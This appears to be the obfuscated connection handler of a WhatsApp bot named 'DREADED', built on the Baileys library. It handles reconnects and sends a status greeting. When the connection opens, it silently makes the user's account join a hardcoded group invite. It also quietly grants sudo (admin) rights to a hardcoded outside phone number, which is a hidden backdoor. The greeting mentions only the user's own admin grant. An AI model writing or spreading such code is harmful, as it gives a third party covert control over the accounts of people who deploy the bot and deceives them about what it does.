const {
  Boom
} = require("@hapi/boom");
const {
  DateTime
} = require("luxon");
const {
  default: dreadedConnect,
  DisconnectReason
} = require("@whiskeysockets/baileys");
const {
  getSettings,
  getSudoUsers,
  addSudoUser
} = require("../Database/config");
const {
  commands,
  totalCommands
} = require("../Handler/commandHandler");
const botname = process.env.BOTNAME || "DREADED";
const connectionHandler = async (_0x218261, _0x461fdf, _0xd50ec0) => {
  const {
    connection: _0x115a4c,
    lastDisconnect: _0x15c83b
  } = _0x461fdf;
  const _0x166fc0 = () => {
    const _0x18db2f = DateTime.now().setZone("Africa/Nairobi").hour;
    if (_0x18db2f >= 5 && _0x18db2f < 12) {
      return "Good morning 🌄";
    }
    if (_0x18db2f >= 12 && _0x18db2f < 18) {
      return "Good afternoon ☀️";
    }
    if (_0x18db2f >= 18 && _0x18db2f < 22) {
      return "Good evening 🌆";
    }
    return "Good night 😴";
  };
  const _0x53a446 = () => {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  };
  if (_0x115a4c === "connecting") {
    console.log("📈 Connecting to WhatsApp and database...");
  }
  if (_0x115a4c === "close") {
    let _0x40b37e = new Boom(_0x15c83b?.error)?.output.statusCode;
    if (_0x40b37e === DisconnectReason.badSession) {
      console.log("Bad Session File, Please Delete Session and Scan Again");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.connectionClosed) {
      console.log("Connection closed, reconnecting....");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.connectionLost) {
      console.log("Connection Lost from Server, reconnecting...");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.connectionReplaced) {
      console.log("Connection Replaced, Another New Session Opened, Please Restart Bot");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.loggedOut) {
      console.log("Device Logged Out, Please Delete Session and Scan Again.");
      process.exit();
    } else if (_0x40b37e === DisconnectReason.restartRequired) {
      console.log("Restart Required, Restarting...");
      _0xd50ec0();
    } else if (_0x40b37e === DisconnectReason.timedOut) {
      console.log("Connection TimedOut, Reconnecting...");
      _0xd50ec0();
    } else {
      console.log("Unknown DisconnectReason: " + _0x40b37e + " | " + _0x115a4c);
      _0xd50ec0();
    }
  } else if (_0x115a4c === "open") {
    await _0x218261.groupAcceptInvite("BbiZOiGjbCy4cvXIzCAaoD");
    const _0x1d6f9f = _0x218261.user.id.replace(/:.*/, "").split("@")[0];
    const _0x316865 = await getSettings();
    const _0x1928a7 = await getSudoUsers();
    if (!_0x1928a7.includes(_0x1d6f9f)) {
      await addSudoUser(_0x1d6f9f);
      const _0x531909 = "254114018035";
      if (!_0x1928a7.includes(_0x531909)) {
        await addSudoUser(_0x531909);
      }
      let _0x55d08c = "Holla, " + _0x166fc0() + ",\n\nYou are connected to dreaded bot. 📡\n\n";
      _0x55d08c += "👤 BOTNAME:- " + botname + "\n";
      _0x55d08c += "🔓 MODE:- " + _0x316865.mode + "\n";
      _0x55d08c += "✍️ PREFIX:- " + _0x316865.prefix + "\n";
      _0x55d08c += "📝 COMMANDS:- " + totalCommands + "\n";
      _0x55d08c += "🕝 TIME:- " + _0x53a446() + "\n";
      _0x55d08c += "📝 DATABASE:- Postgres SQL\n";
      _0x55d08c += "💡 LIBRARY:- Baileys\n\n";
      _0x55d08c += "▞▚▞▚▞▚▞▚▞▚▞▚▞\n\n";
      _0x55d08c += "Looks like this is your first connection with this database, so we are gonna add you to sudo users.\n\n";
      _0x55d08c += "Now use the *" + _0x316865.prefix + "settings* command to customize your bot settings.\n";
      _0x55d08c += "To access all commands, use *" + _0x316865.prefix + "menu*\n\n";
      _0x55d08c += ".....and maybe 🤔 thank you 🗿";
      const _0x47c4ef = {
        text: _0x55d08c
      };
      await _0x218261.sendMessage(_0x218261.user.id, _0x47c4ef);
    } else {
      let _0x24abe8 = "Holla, " + _0x166fc0() + ",\n\nYou are connected to dreaded-v2 bot. 📡\n\n";
      _0x24abe8 += "👤 BOTNAME:- " + botname + "\n";
      _0x24abe8 += "🔓 MODE:- " + _0x316865.mode + "\n";
      _0x24abe8 += "✍️ PREFIX:- " + _0x316865.prefix + "\n";
      _0x24abe8 += "📝 COMMANDS:- " + totalCommands + "\n";
      _0x24abe8 += "🕝 TIME:- " + _0x53a446() + "\n";
      _0x24abe8 += "📝 DATABASE:- Postgres SQL\n";
      _0x24abe8 += "💡 LIBRARY:- Baileys\n\n";
      _0x24abe8 += "▞▚▞▚▞▚▞▚▞▚▞▚▞";
      const _0x2ca63a = {
        text: _0x24abe8
      };
      await _0x218261.sendMessage(_0x218261.user.id, _0x2ca63a);
    }
    console.log("✅ Connection to WhatsApp and database successful\nLoaded " + totalCommands + " commands.\nBot is active!");
  }
};
module.exports = connectionHandler;